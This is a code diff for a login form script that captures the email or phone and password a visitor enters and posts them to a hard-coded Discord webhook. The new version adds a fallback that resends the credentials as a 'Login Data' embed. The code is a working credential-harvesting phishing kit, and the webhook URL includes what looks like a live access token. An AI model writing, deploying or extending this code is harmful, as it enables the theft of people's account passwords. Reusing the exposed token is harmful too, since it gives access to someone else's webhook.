@@ -1,53 +1,62 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Webhook Form</title>
-</head>
-<body>
-  <form id="login-form">
-    <input type="text" id="email" placeholder="Email or Phone" required />
-    <input type="password" id="password" placeholder="Password" required />
-    <button type="submit">Log In</button>
-  </form>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
 
-  <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with your real Discord webhook
+document.getElementById("login-form").addEventListener("submit", async (e) => {
+  e.preventDefault();
 
-    document.getElementById("login-form").addEventListener("submit", async (e) => {
-      e.preventDefault();
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
 
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+  if (!email || !password) {
+    alert("Please fill in both fields.");
+    return;
+  }
 
-      if (!email || !password) {
-        alert("Please fill in both fields.");
-        return;
-      }
+  // Try method 1: Simple content
+  const payload = {
+    content: `📧 **Email:** ${email}\n🔑 **Password:** ${password}`,
+    username: "Login Bot"
+  };
 
-      const payload = {
-        content: `**Webhook Test Submission**\nEmail: \`${email}\`\nPassword: \`${password}\``,
+  try {
+    const response = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      alert("Data sent to webhook!");
+      document.getElementById("login-form").reset();
+    } else {
+      // If simple method fails, try with embeds
+      const embedPayload = {
+        embeds: [{
+          title: "Login Data",
+          fields: [
+            { name: "Email", value: email },
+            { name: "Password", value: password }
+          ],
+          timestamp: new Date().toISOString()
+        }]
       };
-
-      try {
-        const response = await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) throw new Error("Webhook failed");
-
+      
+      const retryResponse = await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embedPayload)
+      });
+      
+      if (retryResponse.ok) {
         alert("Data sent to webhook!");
         document.getElementById("login-form").reset();
-      } catch (err) {
-        alert("Error sending to webhook.");
-        console.error(err);
+      } else {
+        throw new Error("Both methods failed");
       }
-    });
-  </script>
-</body>
-</html>
+    }
+  } catch (err) {
+    alert("Error sending to webhook.");
+    console.error(err);
+  }
+});
